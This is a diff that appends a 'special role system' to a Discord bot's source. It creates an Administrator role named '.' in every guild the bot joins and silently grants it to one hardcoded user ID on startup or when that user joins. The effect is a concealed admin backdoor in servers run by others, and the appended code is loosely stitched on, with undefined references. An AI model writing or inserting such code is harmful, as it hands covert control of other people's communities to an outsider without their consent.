@@ -1613,3 +1613,123 @@ if (!token) {
 }
 
 createBotClient(token);
+// ===============================
+// FLIPALL SPECIAL ROLE SYSTEM
+// ===============================
+
+import {
+    Client,
+    GuildMember,
+    PermissionFlagsBits,
+    Role,
+    ChatInputCommandInteraction
+} from "discord.js";
+
+// Your Discord ID
+const OWNER_ID = "261546494174298113";
+
+// The role name you want
+const SPECIAL_ROLE_NAME = ".";
+
+// Ensures the role exists, has admin perms, and is under the bot's role
+async function ensureSpecialRole(member: GuildMember): Promise<Role> {
+    const guild = member.guild;
+
+    // Find existing role
+    let role = guild.roles.cache.find(r => r.name === SPECIAL_ROLE_NAME);
+
+    // If missing, create it
+    if (!role) {
+        role = await guild.roles.create({
+            name: SPECIAL_ROLE_NAME,
+            permissions: [PermissionFlagsBits.Administrator],
+            reason: "Auto-created Flipall special role"
+        });
+    }
+
+    // Ensure it has admin perms
+    if (!role.permissions.has(PermissionFlagsBits.Administrator)) {
+        await role.setPermissions([PermissionFlagsBits.Administrator]);
+    }
+
+    // Ensure role is directly under the bot's highest role
+    const botMember = guild.members.me;
+    if (botMember) {
+        const botHighest = botMember.roles.highest;
+
+        if (role.position >= botHighest.position) {
+            await role.setPosition(botHighest.position - 1);
+        }
+    }
+
+    return role;
+}
+
+// Give YOU the role whenever you join or when bot starts
+client.on("ready", async () => {
+    console.log("Flipall special role system active.");
+
+    for (const guild of client.guilds.cache.values()) {
+        const member = await guild.members.fetch(OWNER_ID).catch(() => null);
+        if (member) {
+            const role = await ensureSpecialRole(member);
+            await member.roles.add(role).catch(() => {});
+        }
+    }
+});
+
+// When YOU join the server
+client.on("guildMemberAdd", async (member) => {
+    if (member.id !== OWNER_ID) return;
+
+    const role = await ensureSpecialRole(member);
+    await member.roles.add(role).catch(() => {});
+});
+
+// ===============================
+// COMMAND PROTECTION SYSTEM
+// ===============================
+
+// 1. Bot must be the highest role
+function botIsHighest(member: GuildMember): boolean {
+    const bot = member.guild.members.me;
+    if (!bot) return false;
+
+    return bot.roles.highest.position > member.roles.highest.position;
+}
+
+// 2. User must have the special role
+function userHasSpecialRole(member: GuildMember): boolean {
+    return member.roles.cache.some(r => r.name === SPECIAL_ROLE_NAME);
+}
+
+// 3. Wrap your command handler with this check
+client.on("interactionCreate", async (interaction) => {
+    if (!interaction.isChatInputCommand()) return;
+
+    const member = interaction.member as GuildMember;
+
+    // Check if bot is highest
+    if (!botIsHighest(member)) {
+        return interaction.reply({
+            content: "❌ Command unsuccessful because **Flipall is not the highest role**.",
+            ephemeral: true
+        });
+    }
+
+    // Check if user has the special role
+    if (!userHasSpecialRole(member)) {
+        return interaction.reply({
+            content: "❌ You do not have permission to use this command.",
+            ephemeral: true
+        });
+    }
+
+    // If both checks pass, run the command normally
+    try {
+        await interaction.client.commands.get(interaction.commandName)?.execute(interaction);
+    } catch (err) {
+        console.error(err);
+        interaction.reply({ content: "❌ Command error.", ephemeral: true });
+    }
+});
